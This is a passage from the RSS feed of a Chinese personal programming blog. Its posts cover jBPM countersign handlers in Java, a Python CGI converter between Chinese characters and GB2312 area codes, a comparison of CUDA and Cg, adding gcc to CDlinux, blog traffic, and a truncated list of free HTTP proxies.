<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/transition&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;/task-node&gt;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &lt;end-state name="end1"&gt;&lt;/end-state&gt;&nbsp;&nbsp; <br>&lt;/process-definition&gt; <br><i><b>//2/4 com.hjz.jbpm.study.CreateTaskInstanceCountersign.java</b></i><br>package com.hjz.jbpm.study;<br><br>import org.jbpm.graph.def.ActionHandler;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.graph.exe.ExecutionContext;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.graph.exe.Token;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.graph.node.TaskNode;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.taskmgmt.def.Task;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.taskmgmt.exe.TaskMgmtInstance;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp; <br>public class CreateTaskInstanceCountersign implements ActionHandler {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; private static final long serialVersionUID = 1L;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; public void execute(ExecutionContext executionContext) throws Exception {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Token token = executionContext.getToken();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TaskMgmtInstance tmi = executionContext.getTaskMgmtInstance();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TaskNode taskNode = (TaskNode) executionContext.getNode();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Task task = taskNode.getTask("tc_prj_countersign");&nbsp;&nbsp; ?????????ldap ??????????????????????&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmi.createTaskInstance(task, token).setActorId("ernie");&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmi.createTaskInstance(task, token).setActorId("bert");&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmi.createTaskInstance(task, token).setActorId("grover");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>}&nbsp;&nbsp;&nbsp; <br><i><b>//3/4 com.hjz.jbpm.study.CosingerAssiHandler.java</b></i><br>package com.hjz.jbpm.study;<br>import org.jbpm.graph.exe.*;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.taskmgmt.def.*;&nbsp;&nbsp;&nbsp; <br>import org.jbpm.taskmgmt.exe.Assignable;&nbsp;&nbsp;&nbsp; <br>public class CosingerAssiHandler implements AssignmentHandler {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; private static final long serialVersionUID = 1L;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; public void assign(Assignable assignable, ExecutionContext executionContext) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String[] a = { "ernie", "bert", "grover" };&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; assignable.setPooledActors(a);&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; &nbsp;&nbsp; <br>}&nbsp; <br><i><b>//4/4 com.hjz.jbpm.study.TaskEndCountersign.java</b></i><br>package com.hjz.jbpm.study;<br>import java.util.Collection;<br>import java.util.Iterator;<br>import org.jbpm.graph.def.ActionHandler;<br>import org.jbpm.graph.exe.ExecutionContext;<br>import org.jbpm.taskmgmt.exe.TaskInstance;<br>import org.jbpm.taskmgmt.exe.TaskMgmtInstance;&nbsp;&nbsp; <br>public class TaskEndCountersign implements ActionHandler {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; private static final long serialVersionUID = 1L;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; public void execute(ExecutionContext executionContext) throws Exception {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Boolean isDisapprove = Boolean.valueOf((String) executionContext.getVariable("isDisapprove"));&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (isDisapprove.booleanValue()) {&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TaskMgmtInstance tmi = executionContext.getTaskMgmtInstance();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TaskInstance ti = executionContext.getTaskInstance();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; final String actorId = ti.getActorId();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Collection c = tmi.getSignallingTasks(executionContext);&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (Iterator it = c.iterator(); it.hasNext();) {&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TaskInstance task = (TaskInstance) it.next();&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!(actorId.equals(task.getActorId())) &amp;&amp; (!task.hasEnded())) {&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; task.end("disapprove");&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp; <br>}&nbsp;&nbsp;&nbsp; <br><br><b>3.2.3</b><br>BPM jPDL 用户开发手册 3.2.3 (全文pdf) <wbr>http://zhangym.javaeye.com/blog/253544]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720110714857908/</guid>
    </item>
    <item>
      <title>
<![CDATA[python转换区位码的cgi代码]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200982342114384/</link>
      <description>
<![CDATA[<style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style>区位码和汉字的转化原理很简单，获取字符串的gb2312编码字符数组，然后将每个字符减去160<br>word=u"中文测试"<br>print ''.join(map(lambda(x):str(ord(x)-160),word.encode('gb2312')))<br>5448463618664252<br>同理:根据区位码获取汉字只要反过来即可<br>word='5448463618664252'<br> print ''.join(map(lambda(i):
chr(int(word[i*2:i*2+2])+160),[i for i in
range(len(word)/2)])).decode('gb2312'),<br><br>区位码转化cgi网页，使用jquery实现ajax效果<div>#!/usr/bin/python</div>
<div>#encoding: utf-8</div>
<div>imp<wbr>ort cgitb,string,os</div>
<div>cgitb.enable()</div>
<div>imp<wbr>ort cgi</div>
<div>print "Content-Type: text/html;charset=utf-8\n"</div>
<div>form=cgi.FieldStorage()</div>
<div>word=form.getfirst('word')</div>
<div>act=form.getfirst('act')</div>
<div>if word == None:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;word=u'你好'.encode('utf-8')</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;num = ''</div>
<div>if act == None:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print "&lt;html&gt;&lt;head&gt;&lt;title&gt;Python On<wbr>line&lt;/title&gt;&lt;/head&gt;"</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print '''&lt;script src='hjz/jquery.js'&gt;&lt;/script&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;script language="javas<wbr>cript"&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(document).ready(function(){</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#gb2num").click(function(){</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#wordi").html("转换中...");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#num").val("");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url="%s?act=gb2num&amp;word="+encodeURI($("#word").val());</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.get(url,</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function(da<wbr>ta){</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#wordi").html("转换&lt;strong&gt;成功&lt;/strong&gt;");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#num").val(da<wbr>ta);</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#num2gb").click(function(){</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#numi").html("转换中...");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#word").val("");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.get("%s?act=num2gb&amp;word="+$("#num").val(),</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function(da<wbr>ta){</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#numi").html("转换&lt;strong&gt;成功&lt;/strong&gt;");</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$("#word").val(da<wbr>ta);</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;''' % (os.path.basename(__file__), os.path.basename(__file__))</div>
<div>&nbsp;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print '''&lt;table border="0"&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;tr&gt;&lt;td height=200&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea id="word" rows="10"&gt;%s&lt;/textarea&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&lt;td&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;table&gt;&lt;tr&gt;&lt;td&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div style="color:green" id="wordi"&gt;&lt;/div&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="button" id="gb2num" value="&gt;&gt;汉字转区位码&gt;&gt;"&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div style="color:green" id="numi"&gt;&lt;/div&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="button" id="num2gb" value="&lt;&lt;区位码转汉字&lt;&lt;"&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&lt;td&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;textarea id="num" rows="10"&gt;%s&lt;/textarea&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;''' % (word,num)</div>
<div>elif act == 'gb2num':</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(word)&lt;2:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print 'Error'</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print ''.join(map(lambda(x):str(ord(x)-160),word.strip().decode('utf-8').encode('gb2312'))),</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print 'Error'</div>
<div>else:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print ''.join(map(lambda(i): chr(int(word[i*2:i*2+2])+160),[i for i in range(len(word)/2)])).decode('gb2312').encode('utf-8'),</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:</div>
<div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print 'Error'</div>
<div></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200982342114384/</guid>
    </item>
    <item>
      <title>
<![CDATA[也谈cuda和Cg]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201031001359341/</link>
      <description>
<![CDATA[首先，这两个都是GPU技术，他们的全称是<br>GPU: Graphics Process Unit<br>GPGPU: General Purpose Graphics Process Unit<br>cuda: Compute Unified Device Architecture,<br>Cg: C for Graphics<br>Cg是一种GPU的图形图像渲染技术，可以用来代替传统的OpenGL固定管线技术，从而加速绘制。<br>Cuda是一种使用用GPU进行单机并行计算的技术，可以使程序并行运算，从而加快程序运行速度。<br>理论上讲，应该先有Cg，再有的Cuda，因为GPU首先是GPU，然后再是GPGPU，而且并行计算也是图形渲染的一种，可以用Cg实现许多Cuda运算。<br>所有的东西，都是建立的GPU硬件结构的基础上的，明白了GPU的硬件结构，再理解Cg和Cuda就是水到渠成了。<br>现在的CPU一直在喊加速，多核，并行，其实很简单，人多力量大嘛，可是CPU设计的初衷就是要做一个超人，而GPU则不然，有人将GPU比做农民起义，最基本的图形图像运算要求就是将整个屏幕的点同时输出，所以GPU天生就是进行X*Y个点同时处理的，如果将X*Y的矩阵当做一个屏幕点，每个矩阵的值当做点的颜色，着色的过程就是运算，所以Cg着色和Cuda在本质上讲就是一样的<br><br><br>当然，Cg是做渲染的，更侧重坐标变换和颜色计算；Cuda是做运算的，更注重算法复杂度。<br>但他们本质是用的GPU流水线，所以优化的本质是相同的：减少分支指令，合理分解和简化计算。<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201031001359341/</guid>
    </item>
    <item>
      <title>
<![CDATA[为CDlinux0.4.9增加gcc包]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200941652327303/</link>
      <description>
<![CDATA[<style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace"  >首先把这一堆包解压缩，然后再找一个正常工作的include文件夹，一切ok，但是CDlinux的ramdisk太小，只有12M，所以要用一个新的ramdisk替换，Ramdisk的制作方法可以参考另外一篇文章，也可以直接从下面提供的地址下载。<br>binutils_2.15-6_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc6-dev_2.3.2.ds1-22_i386.deb<br>cpp-3.3_3.3.5-13_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libgc1_6.4-1_i386.deb<br>cpp_3.3.5-3_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libgcc1_3.4.3-13_i386.deb<br>g++-3.3_3.3.5-13_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libglib1.2_1.2.10-9_i386.deb<br>g++_3.3.5-3_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libglib2.0-0_2.6.4-1_i386.deb<br>gcc-3.3_3.3.5-13_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libstdc++5_3.3.5-13_i386.deb<br>gcc_3.3.5-3_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libstdc++5-3.3-dev_3.3.5-13_i386.deb<br>gcc-3.3-base_3.3.5-13_i386.deb &nbsp;libungif4g_4.1.3-2sarge1_i386.deb<br>libc6_2.3.2.ds1-22_i386.deb &nbsp;&nbsp;&nbsp;&nbsp;locales_2.3.2.ds1-22_all.deb<br>可以在cdlinux下运行的tgz包已经做好放在</font><a target="_blank" rel="nofollow" href="https://www.getdropbox.com/referrals/NTE5NDg4NTk"  >dropbox</a><font face="monospace"  >上了。<br>安装方法：<br>1.下载</font><a target="_blank" rel="nofollow" href="http://dl.getdropbox.com/u/194885/gcc-3.3.3-cdl.tgz"  >gcc-3.3.3-cdl.tgz</a><font face="monospace"  >到CDlinux/extra目录下，和其他的tgz和md包放在一起<br>2.下载</font><a target="_blank" rel="nofollow" href="http://dl.getdropbox.com/u/194885/CDlinux.100.gz"  >CDlinux.100.gz</a><font face="monospace"  >到CDlinux目录下，把原来的CDlinux.gz删掉(或者重命名)，将下载的CDlinux.100.gz重命名为CDlinux.gz<br>3.重启CDlinux即可。<br></font>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200941652327303/</guid>
    </item>
    <item>
      <title>
<![CDATA[博客访问量与谷歌]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720104211538730/</link>
      <description>
<![CDATA[前段时间博客更新比较频繁，博客访问量持续上涨，最终稳定在200左右。看了下访问统计，一多半来自Google搜索<br>最近更新不太多，突然发现，访问量下降到每日不足100，然后就想到了谷歌的退出]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720104211538730/</guid>
    </item>
    <item>
      <title>
<![CDATA[免费HTTP代理列表]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010224559237/</link>
      <description>
<![CDATA[http://120.50.48.179:3128<br>http://119.70.40.101:8080<br>http://118.96.146.83:8080<br>http://125.163.236.167:8080<br>http://125.163.236.167:80<br>http://120.50.57.248:3128<br>http://164.78.252.25:80<br>http://119.70.40.102:8080<br>http://202.162.212.29:80<br>http://217.109.154.234:3128<br>http://219.90.90.101:8080<br>http://190.27.194.90:8080<br>http://200.48.170.221:3128<br>http://200.48.170.222:3128<br>http://189.56.100.42:3128<br>http://189.108.214.18:3128<br>http://58.68.168.171:80<br>http://58.68.168.170:80<br>http://58.68.168.193:80<br>http://58.68.168.40:80<br>http://58.68.168.42:80<br>http://58.68.168.192:80<br>http://58.68.168.43:80<br>http://58.68.168.45:80<br>http://58.68.168.97:80<br>http://58.68.168.84:80<br>http://58.68.168.44:80<br>http://58.68.168.46:80<br>http://58.68.168.74:80<br>http://41.202.0.131:80<br>http://82.99.195.94:3128<br>http://110.8.253.100:8080<br>http://125.40.47.112:3128<br>http://118.96.24.227:8080<br>http://117.102.101.219:8080<br>http://118.98.212.242:3128<br>http://202.98.23.114:80<br>http://202.98.23.116:80<br>http://200.43